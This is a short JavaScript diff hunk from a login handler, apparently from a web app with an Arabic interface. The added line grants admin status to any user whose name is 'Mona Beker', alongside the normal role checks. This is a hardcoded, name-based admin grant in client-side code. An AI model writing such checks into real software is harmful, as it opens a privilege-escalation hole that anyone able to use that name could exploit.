@@ -264,7 +264,7 @@ function afterLogin(){
   if(ap) ap.classList.remove("hidden");
 let w = document.getElementById("welcome");
 let ti = document.getElementById("techInfo");
-let isAdmin = userObj.role === 'admin' || userObj.role === 'super_admin';
+let isAdmin = userObj.role === 'admin' || userObj.role === 'super_admin' || userObj.name === 'Mona Beker';
 let isMahdy = userObj.role === 'super_admin';
 if (w) w.innerText = "أهلاً " + userObj.name;
 if (ti) {
